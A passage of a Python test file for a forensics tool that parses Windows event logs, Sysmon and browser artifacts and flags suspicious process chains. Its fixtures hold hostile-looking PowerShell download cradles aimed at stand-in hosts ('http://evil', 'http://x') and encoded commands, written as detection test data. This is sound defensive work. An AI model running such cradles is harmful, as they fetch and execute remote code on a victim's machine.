            "process": {"entity_id": "child", "pid": 200, "parent_pid": 100, "parent_name": "winword.exe", "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -enc AAAA"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    report = _build_process_tree_report(graph, events, selected_scope="evidence")
    sample = _build_process_tree_sample_chains(graph)
    assert report["nodes_count"] == 2
    assert report["edges_count"] == 1
    assert report["suspicious_chain_count"] >= 1
    assert sample
    assert "Office spawned script interpreter" in sample[0]["reasons"]


def test_process_graph_browser_internal_self_spawn_is_low_noise() -> None:
    events = [
        {
            "id": "evt-parent",
            "event_id": "evt-parent",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "parent", "pid": 100, "name": "msedge.exe", "path": "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:00:01Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "child", "pid": 101, "parent_pid": 100, "parent_name": "msedge.exe", "name": "msedge.exe", "path": "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    child = next(node for node in graph["nodes"] if node["id"] == "child")
    sample = _build_process_tree_sample_chains(graph)
    assert child["risk_score"] <= 20
    assert "browser_internal_child" in child["badges"]
    assert "noisy_browser_child" in child["data_quality"]
    assert not sample


def test_process_graph_browser_internal_helper_is_low_noise() -> None:
    events = [
        {
            "id": "evt-parent",
            "event_id": "evt-parent",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "parent", "pid": 100, "name": "msedge.exe", "path": "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:00:01Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "child", "pid": 101, "parent_pid": 100, "parent_name": "msedge.exe", "name": "identity_helper.exe", "path": "C:\\Program Files\\Microsoft\\Edge\\Application\\148.0.3967.54\\identity_helper.exe"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    child = next(node for node in graph["nodes"] if node["id"] == "child")
    sample = _build_process_tree_sample_chains(graph)
    assert child["risk_score"] <= 20
    assert "browser_internal_child" in child["badges"]
    assert "noisy_browser_child" in child["data_quality"]
    assert not sample


def test_process_graph_browser_spawning_downloaded_payload_remains_high() -> None:
    events = [
        {
            "id": "evt-parent",
            "event_id": "evt-parent",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "parent", "pid": 100, "name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:00:01Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "child", "pid": 101, "parent_pid": 100, "parent_name": "chrome.exe", "name": "payload.exe", "path": "C:\\Users\\dfir\\Downloads\\payload.exe"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    child = next(node for node in graph["nodes"] if node["id"] == "child")
    sample = _build_process_tree_sample_chains(graph)
    assert child["risk_score"] >= 85
    assert "Browser spawned executable" in child["risk_reasons"]
    assert "browser_child" in child["badges"]
    assert sample


def test_build_process_tree_bundle_filters_connected_component(monkeypatch: pytest.MonkeyPatch) -> None:
    process_events = [
        {
            "id": "evt-1",
            "event_id": "evt-1",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-proc"},
            "process": {"entity_id": "A", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
        },
        {
            "id": "evt-2",
            "event_id": "evt-2",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-proc"},
            "process": {
                "entity_id": "B",
                "pid": 200,
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent_entity_id": "A",
                "parent_pid": 100,
                "parent_name": "explorer.exe",
            },
        },
    ]

    def _fake_search(context, *, size, extra_filters=None, timeline=False):  # noqa: ANN001
        if extra_filters and any(item.get("term", {}).get("event.type") == "process_start" for item in extra_filters):
            return process_events, len(process_events), {}
        return [], 0, {}

    monkeypatch.setattr("app.services.debug_export._search_scope_events", _fake_search)
    bundle = build_process_tree_bundle(
        SimpleNamespace(id="case-1"),
        [SimpleNamespace(id="ev-1", metadata_json={})],
        scope="evidence",
        evidence_id="ev-1",
        pid=200,
    )
    assert bundle["graph"]["summary"]["nodes_count"] == 2
    assert bundle["graph"]["summary"]["edges_count"] == 1
    assert {node["name"] for node in bundle["graph"]["nodes"]} == {"explorer.exe", "powershell.exe"}


def test_evtx_4688_suspicious_powershell(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,NewProcessName,ProcessCommandLine,SubjectUserName,Computer\n"
        '4688,Security,Microsoft-Windows-Security-Auditing,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"powershell.exe -enc SQBFAFgA",alex,MOVISTAR-PC\n',
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert "suspicious" in doc["tags"]
    assert "powershell_encoded" in doc["suspicious_reasons"]
    assert doc["process"]["name"] == "powershell.exe"


def test_evtx_4104_script_block_preserves_payload_and_xml(tmp_path: Path) -> None:
    path = tmp_path / "PowerShell-EvtxECmd.csv"
    xml = (
        "<Event><System><Execution ProcessID='1234' ThreadID='8'/></System><EventData>"
        "<Data Name='ScriptBlockText'>IEX(New-Object Net.WebClient).DownloadString('http://x')</Data>"
        "<Data Name='ScriptBlockId'>abc</Data></EventData></Event>"
    )
    path.write_text(
        f"EventID,Channel,Provider,PayloadData1,Xml,Computer\n4104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,block-part-1,\"{xml}\",MOVISTAR-PC\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "script_block"
    assert doc["windows"]["payload"]["PayloadData1"] == "block-part-1"
    assert doc["windows"]["event_data"]["ScriptBlockId"] == "abc"
    assert "PowerShell download cradle" in doc["suspicious_reasons"]


def test_evtx_4698_scheduled_task_created(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,TaskName,TaskContent,SubjectUserName\n4698,Security,Microsoft-Windows-Security-Auditing,\\\\Microsoft\\\\Windows\\\\Update,cmd.exe /c calc.exe,alex\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "scheduled_task_created"
    assert doc["task"]["name"] == "\\\\Microsoft\\\\Windows\\\\Update"


def test_evtx_5156_network_connection_allowed(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,Application,SourceAddress,SourcePort,DestAddress,DestinationPort,Protocol,Direction\n5156,Security,Microsoft-Windows-Security-Auditing,C:\\Windows\\System32\\curl.exe,10.0.0.2,50000,8.8.8.8,443,TCP,Outbound\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "network_connection_allowed"
    assert doc["network"]["source_ip"] == "10.0.0.2"
    assert doc["network"]["destination_ip"] == "8.8.8.8"


def test_evtx_1116_defender_detected(tmp_path: Path) -> None:
    path = tmp_path / "Defender-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,ThreatName,Path,Action,Severity,DetectionUser\n1116,Microsoft-Windows-Windows Defender/Operational,Microsoft-Windows-Windows Defender,TestMal,C:\\Users\\Public\\bad.exe,Quarantine,High,alex\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "malware_detected"
    assert doc["detection"]["threat_name"] == "TestMal"


def test_evtx_1102_audit_log_cleared(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,SubjectUserName,SubjectDomainName\n1102,Security,Microsoft-Windows-Eventlog,alex,CONTOSO\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "audit_log_cleared"
    assert "anti_forensics" in doc["tags"]


def test_evtx_malformed_xml_does_not_break(tmp_path: Path) -> None:
    path = tmp_path / "Broken-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,Xml,Message\n4104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,\"<Event><broken>\",broken xml\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "powershell_script_block"
    assert doc["windows"]["event_data"] == {}


def test_evtx_unknown_payload_preserved(tmp_path: Path) -> None:
    path = tmp_path / "UnknownPayload-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,PayloadData27,Message\n9999,Application,CustomProvider,surprise,hello\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["payload"]["PayloadData27"] == "surprise"
    assert doc["raw"]["PayloadData27"] == "surprise"


def test_evtx_missing_columns_do_not_break(tmp_path: Path) -> None:
    path = tmp_path / "Minimal-EvtxECmd.csv"
    path.write_text("EventID,Provider\n4624,Microsoft-Windows-Security-Auditing\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "event_id_4624"
    assert doc["windows"]["provider"] == "Microsoft-Windows-Security-Auditing"
    assert "source_mismatch" in doc["tags"]


def test_evtx_header_variants_still_map_logon_events(tmp_path: Path) -> None:
    path = tmp_path / "Variant-EvtxECmd.csv"
    path.write_text(
        "Event ID,LogName,ProviderName,TimeCreated UTC,TargetUserName,TargetDomainName,LogonType,ProcessName\n"
        " 4624 ,Security,Microsoft-Windows-Security-Auditing,2026-05-03T10:38:05Z,SYSTEM,NT AUTHORITY,5,C:\\Windows\\System32\\services.exe\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_id"] == 4624
    assert doc["event"]["type"] == "logon_success"
    assert doc["windows"]["channel"] == "Security"
    assert doc["user"]["name"] == "SYSTEM"
    assert doc["process"]["path"] == "C:\\Windows\\System32\\services.exe"


def test_evtx_payload_json_4624_local_logon_is_extracted(tmp_path: Path) -> None:
    path = tmp_path / "20260503103805_EvtxECmd_Output.csv"
    payload = {
        "EventData": {
            "Data": [
                {"@Name": "SubjectUserSid", "#text": "S-1-5-18"},
                {"@Name": "SubjectUserName", "#text": "MOVISTAR-PC$"},
                {"@Name": "SubjectDomainName", "#text": "WORKGROUP"},
                {"@Name": "SubjectLogonId", "#text": "0x3E7"},
                {"@Name": "TargetUserSid", "#text": "S-1-5-18"},
                {"@Name": "TargetUserName", "#text": "SYSTEM"},
                {"@Name": "TargetDomainName", "#text": "NT AUTHORITY"},
                {"@Name": "TargetLogonId", "#text": "0x3E7"},
                {"@Name": "LogonType", "#text": "5"},
                {"@Name": "LogonProcessName", "#text": "Advapi  "},
                {"@Name": "AuthenticationPackageName", "#text": "Negotiate"},
                {"@Name": "WorkstationName", "#text": "-"},
                {"@Name": "ProcessId", "#text": "0x2FC"},
                {"@Name": "ProcessName", "#text": "C:\\Windows\\System32\\services.exe"},
                {"@Name": "IpAddress", "#text": "-"},
                {"@Name": "IpPort", "#text": "-"},
            ]
        }
    }
    _write_evtx_payload_csv(path, 4624, payload)
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["TargetUserName"] == "SYSTEM"
    assert doc["windows"]["event_data"]["LogonType"] == "5"
    assert doc["user"]["name"] == "SYSTEM"
    assert doc["user"]["domain"] == "NT AUTHORITY"
    assert doc["user"]["sid"] == "S-1-5-18"
    assert doc["windows"]["logon_type"] == "5"
    assert doc["process"]["path"] == "C:\\Windows\\System32\\services.exe"
    assert doc["source"]["ip"] is None
    assert "Successful logon: NT AUTHORITY\\SYSTEM (LogonType 5) from local host" == doc["event"]["message"]
    assert doc["windows"]["payload"]["Payload"]
    assert doc["raw"]["Payload"]


def test_evtx_payload_json_4624_rdp_logon_with_ip(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {
        "EventData": {
            "Data": [
                {"@Name": "TargetUserSid", "#text": "S-1-5-21-1"},
                {"@Name": "TargetUserName", "#text": "alex"},
                {"@Name": "TargetDomainName", "#text": "CONTOSO"},
                {"@Name": "TargetLogonId", "#text": "0xABCD"},
                {"@Name": "LogonType", "#text": "10"},
                {"@Name": "ProcessName", "#text": "C:\\Windows\\System32\\winlogon.exe"},
                {"@Name": "IpAddress", "#text": "192.168.1.50"},
                {"@Name": "IpPort", "#text": "3389"},
            ]
        }
    }
    _write_evtx_payload_csv(path, 4624, payload)
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["user"]["name"] == "alex"
    assert doc["source"]["ip"] == "192.168.1.50"
    assert doc["source"]["port"] == "3389"
    assert doc["windows"]["logon_type"] == "10"
    assert "rdp" in doc["tags"]
    assert "192.168.1.50" in doc["event"]["message"]


def test_evtx_payload_json_4625_includes_failure_details(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {
        "EventData": {
            "Data": [
                {"@Name": "TargetUserName", "#text": "bob"},
                {"@Name": "TargetDomainName", "#text": "CONTOSO"},
                {"@Name": "TargetUserSid", "#text": "S-1-5-21-2"},
                {"@Name": "LogonType", "#text": "3"},
                {"@Name": "IpAddress", "#text": "10.0.0.5"},
                {"@Name": "IpPort", "#text": "51515"},
                {"@Name": "ProcessName", "#text": "C:\\Windows\\System32\\lsass.exe"},
                {"@Name": "Status", "#text": "0xc000006d"},
                {"@Name": "SubStatus", "#text": "0xc000006a"},
                {"@Name": "FailureReason", "#text": "Unknown user name or bad password"},
            ]
        }
    }
    _write_evtx_payload_csv(path, 4625, payload)
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["FailureReason"] == "Unknown user name or bad password"
    assert doc["user"]["name"] == "bob"
    assert doc["source"]["ip"] == "10.0.0.5"
    assert "0xc000006d" in doc["event"]["message"]


def test_evtx_payload_json_4688_maps_command_line(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {
        "EventData": {
            "Data": [
                {"@Name": "NewProcessName", "#text": "C:\\Windows\\System32\\cmd.exe"},
                {"@Name": "ProcessCommandLine", "#text": "cmd.exe /c whoami"},
                {"@Name": "ParentProcessName", "#text": "C:\\Windows\\explorer.exe"},
                {"@Name": "NewProcessId", "#text": "0x123"},
                {"@Name": "CreatorProcessId", "#text": "0x100"},
                {"@Name": "SubjectUserName", "#text": "alex"},
                {"@Name": "SubjectDomainName", "#text": "CONTOSO"},
            ]
        }
    }
    _write_evtx_payload_csv(path, 4688, payload)
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["ProcessCommandLine"] == "cmd.exe /c whoami"
    assert doc["process"]["command_line"] == "cmd.exe /c whoami"
    assert doc["process"]["parent_path"] == "C:\\Windows\\explorer.exe"
    assert "explorer.exe -> cmd.exe" in doc["event"]["message"]


def test_evtx_csv_sysmon_preserves_guid_image_and_time(tmp_path: Path) -> None:
    path = tmp_path / "sysmon.csv"
    path.write_text(
        "\n".join(
            [
                "EventID,Channel,Provider,Computer,UtcTime,ProcessGuid,ProcessId,Image,CommandLine,CurrentDirectory,User,ParentProcessGuid,ParentProcessId,ParentImage,ParentCommandLine,IntegrityLevel",
                '1,Microsoft-Windows-Sysmon/Operational,Microsoft-Windows-Sysmon,desktop-proc,2026-05-15T10:00:00Z,{GUID-A},100,C:\\Windows\\explorer.exe,explorer.exe,C:\\Windows,DFIR\\dfir,{GUID-ROOT},4,C:\\Windows\\System32\\userinit.exe,userinit.exe,Medium',
            ]
        ),
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["artifact"]["type"] == "process"
    assert doc["artifact"]["parser"] == "sysmon_evtx"
    assert doc["@timestamp"] == "2026-05-15T10:00:00+00:00"
    assert doc["process"]["entity_id"] == "{GUID-A}"
    assert doc["process"]["parent_entity_id"] == "{GUID-ROOT}"
    assert doc["process"]["pid"] == 100
    assert doc["process"]["path"] == "C:\\Windows\\explorer.exe"
    assert doc["process"]["name"] == "explorer.exe"
    assert doc["process"]["parent_path"] == "C:\\Windows\\System32\\userinit.exe"
    assert doc["process"]["parent_name"] == "userinit.exe"
    assert doc["process"]["current_directory"] == "C:\\Windows"
    assert doc["process"]["integrity_level"] == "Medium"
    assert doc["execution"]["is_execution_confirmed"] is True


def test_evtx_payload_json_4104_maps_powershell_namespace(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {
        "EventData": {
            "Data": [
                {"@Name": "ScriptBlockText", "#text": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil')"},
                {"@Name": "ScriptBlockId", "#text": "block-1"},
                {"@Name": "Path", "#text": "C:\\Users\\alex\\script.ps1"},
                {"@Name": "MessageNumber", "#text": "1"},
                {"@Name": "MessageTotal", "#text": "4"},
            ]
        }
    }
    _write_evtx_payload_csv(path, 4104, payload, Channel="Microsoft-Windows-PowerShell/Operational", Provider="Microsoft-Windows-PowerShell")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["ScriptBlockId"] == "block-1"
    assert doc["powershell"]["script_block_text"].startswith("Invoke-Expression")
    assert doc["powershell"]["message_number"] == "1"
    assert doc["powershell"]["message_total"] == "4"
    assert doc["event"]["message"].startswith("PowerShell script block 1/4:")


def test_evtx_payload_json_7045_service_created(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {"EventData": {"Data": [{"@Name": "ServiceName", "#text": "MalSvc"}, {"@Name": "ServiceFileName", "#text": "C:\\ProgramData\\svc.exe"}, {"@Name": "AccountName", "#text": "LocalSystem"}]}}
    _write_evtx_payload_csv(path, 7045, payload, Channel="System", Provider="Service Control Manager")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["ServiceName"] == "MalSvc"
    assert doc["service"]["name"] == "MalSvc"
    assert doc["service"]["image_path"] == "C:\\ProgramData\\svc.exe"
    assert "MalSvc" in doc["event"]["message"]


def test_evtx_payload_json_4698_task_content_extracts_command(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    task_xml = "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgA</Arguments></Exec></Actions></Task>"
    payload = {"EventData": {"Data": [{"@Name": "TaskName", "#text": "\\\\Microsoft\\\\Windows\\\\Updater"}, {"@Name": "TaskContent", "#text": task_xml}, {"@Name": "SubjectUserName", "#text": "alex"}, {"@Name": "SubjectDomainName", "#text": "CONTOSO"}]}}
    _write_evtx_payload_csv(path, 4698, payload)
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["TaskName"] == "\\\\Microsoft\\\\Windows\\\\Updater"
    assert doc["task"]["command"] == "powershell.exe"
    assert doc["task"]["arguments"] == "-enc SQBFAFgA"
    assert doc["user"]["name"] == "alex"


def test_evtx_payload_json_5156_connection_maps_network(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {"EventData": {"Data": [{"@Name": "Application", "#text": "C:\\Windows\\System32\\curl.exe"}, {"@Name": "SourceAddress", "#text": "10.0.0.2"}, {"@Name": "SourcePort", "#text": "50000"}, {"@Name": "DestAddress", "#text": "8.8.8.8"}, {"@Name": "DestinationPort", "#text": "443"}, {"@Name": "Protocol", "#text": "TCP"}, {"@Name": "Direction", "#text": "Outbound"}]}}
    _write_evtx_payload_csv(path, 5156, payload)
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["Application"] == "C:\\Windows\\System32\\curl.exe"
    assert doc["network"]["application"] == "C:\\Windows\\System32\\curl.exe"
    assert doc["process"]["path"] == "C:\\Windows\\System32\\curl.exe"
    assert doc["source"]["ip"] == "10.0.0.2"
    assert doc["destination"]["ip"] == "8.8.8.8"


def test_evtx_payload_json_1116_defender_maps_detection(tmp_path: Path) -> None:
    path = tmp_path / "EvtxECmd_Output.csv"
    payload = {"EventData": {"Data": [{"@Name": "ThreatName", "#text": "TestMal"}, {"@Name": "ThreatID", "#text": "1001"}, {"@Name": "Severity", "#text": "High"}, {"@Name": "Category", "#text": "Trojan"}, {"@Name": "Path", "#text": "C:\\Users\\Public\\bad.exe"}, {"@Name": "ProcessName", "#text": "C:\\Windows\\System32\\MpCmdRun.exe"}, {"@Name": "Action", "#text": "Quarantine"}, {"@Name": "DetectionUser", "#text": "alex"}]}}
    _write_evtx_payload_csv(path, 1116, payload, Channel="Microsoft-Windows-Windows Defender/Operational", Provider="Microsoft-Windows-Windows Defender")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["ThreatName"] == "TestMal"
    assert doc["detection"]["threat_name"] == "TestMal"
    assert doc["detection"]["path"] == "C:\\Users\\Public\\bad.exe"
    assert doc["process"]["path"] == "C:\\Windows\\System32\\MpCmdRun.exe"
    assert doc["user"]["name"] == "alex"


def test_browser_normalization_extracts_profile_user(tmp_path: Path) -> None:
    path = tmp_path / "BrowserHistory.csv"
    path.write_text("URL,Title,VisitCount,Path\nhttps://example.com,Example,5,C:\\Users\\alex\\AppData\\Local\\Chrome\\History\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": "C:\\Users\\alex\\AppData\\Local\\Chrome\\History", "parser": "generic_csv"})[0]
    assert doc["event"]["category"] == "web"
    assert doc["browser"]["url"] == "https://example.com"
    assert doc["user"]["name"] == "alex"


def test_artifact_classification_browser_history() -> None:
    result = classify_artifact(Path("BrowserHistoryView.csv"), ["URL", "Title", "Visit Time", "Browser", "Profile"])
    assert result["artifact_type"] == "browser"
    assert result["parser"] == "browser_csv"
    assert result["browser_artifact_type"] == "history"


def test_artifact_classification_browser_downloads_headers() -> None:
    result = classify_artifact(Path("downloads.csv"), ["Download URL", "Target Path", "Filename", "Start Time", "Browser"])
    assert result["artifact_type"] == "browser"
    assert result["parser"] == "browser_csv"
    assert result["browser_artifact_type"] == "download"


def test_artifact_classification_browser_jsonl_downloads_headers() -> None:
    result = classify_artifact(Path("chrome_downloads_sample.jsonl"), ["Browser", "Profile", "Url", "TargetPath", "EndTime", "State", "SourceFile"])
    assert result["artifact_type"] == "browser"
    assert result["parser"] == "browser_jsonl"
    assert result["browser_artifact_type"] == "download"


def test_browser_history_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "browser_history_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "browserhistoryview", "browser_artifact_type": "history"})
    normal_doc = next(doc for doc in docs if doc["url"]["domain"] == "example.com")
    suspicious_doc = next(doc for doc in docs if "paste_site" in doc["tags"])
    assert normal_doc["event"]["type"] == "browser_visit"
    assert normal_doc["artifact"]["parser"] == "browser_csv"
    assert normal_doc["browser"]["name"] == "chrome"
    assert normal_doc["browser"]["profile"] == "Default"
    assert normal_doc["url"]["full"] == "https://example.com/welcome"
    assert normal_doc["browser"]["title"] == "Example welcome"
    assert normal_doc["timestamp_precision"] == "browser_visit_time"
    assert normal_doc["execution"]["is_execution_confirmed"] is False
    assert normal_doc["search_text"]
    assert suspicious_doc["url"]["domain"] == "pastebin.com"
    assert "paste_site" in suspicious_doc["tags"]


def test_browser_download_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "generic_browser", "browser_artifact_type": "download"})
    exe_doc = next(doc for doc in docs if doc["file"]["name"] == "setup.exe")
    ps1_doc = next(doc for doc in docs if doc["file"]["name"] == "runme.ps1")
    zip_doc = next(doc for doc in docs if doc["file"]["name"] == "archive.zip")
    double_ext_doc = next(doc for doc in docs if doc["file"]["name"] == "Invoice.pdf.exe")
    assert exe_doc["event"]["type"] == "file_downloaded"
    assert exe_doc["event"]["category"] == "download"
    assert exe_doc["file"]["path"] == "C:\\Users\\alex\\Downloads\\setup.exe"
    assert exe_doc["download"]["target_path"] == "C:\\Users\\alex\\Downloads\\setup.exe"
    assert exe_doc["browser"]["name"] == "chrome"
    assert exe_doc["user"]["name"] == "alex"
    assert exe_doc["download"]["state"] == "complete"
    assert "Browser downloaded executable" in exe_doc["suspicious_reasons"]
    assert "executable_download" in exe_doc["tags"]
    assert "Browser downloaded script" in ps1_doc["suspicious_reasons"]
    assert "script_download" in ps1_doc["tags"]
    assert "Browser URL uses direct IP" in ps1_doc["suspicious_reasons"]
    assert "archive_download" in zip_doc["tags"]
    assert "cloud_storage" in zip_doc["tags"]
    assert any("double extension" in reason.lower() for reason in double_ext_doc["suspicious_reasons"])
    assert double_ext_doc["raw"]["Filename"] == "Invoice.pdf.exe"


def test_browser_benign_windowsupdate_download_has_low_risk(tmp_path: Path) -> None:
    path = tmp_path / "browser_windowsupdate.csv"
    path.write_text(
        "Browser,Profile,Download URL,Target Path,Download End Time,Total Bytes,Received Bytes,State,SourceFile\n"
        "Chrome,Default,https://download.windowsupdate.com/file.cab,C:\\Users\\dfir\\Downloads\\file.cab,2026-05-03T10:00:10Z,204800,204800,Complete,C:\\Users\\dfir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\n",
        encoding="utf-8",
    )
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "browser_csv", "browser_artifact_type": "download"})
    doc = docs[0]
    assert doc["risk_score"] == 0
    assert doc["execution"]["is_execution_confirmed"] is False


def test_browser_classification_skips_sensitive_login_data() -> None:
    result = classify_artifact(Path("Login Data"))
    assert result["artifact_type"] == "browser"
    assert result["parser"] == "unsupported_sensitive_artifact"


def test_browser_classification_skips_optional_login_data_placeholder() -> None:
    result = classify_artifact(Path("optional_Login_Data_should_skip.txt"))
    assert result["artifact_type"] == "browser"
    assert result["parser"] == "unsupported_sensitive_artifact"


def test_browser_detection_does_not_flag_windows_file_history_scheduled_task() -> None:
    result = classify_artifact(Path("C:/Windows/System32/Tasks/Microsoft/Windows/FileHistory/File History (maintenance mode)"))
    assert result["artifact_type"] != "browser"


def test_browser_detection_does_not_flag_every_file_inside_browser_profile() -> None:
    result = classify_artifact(Path("C:/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/Preferences"))
    assert result["artifact_type"] != "browser"


def test_browser_sensitive_artifact_does_not_index_events(tmp_path: Path) -> None:
    path = tmp_path / "Login Data"
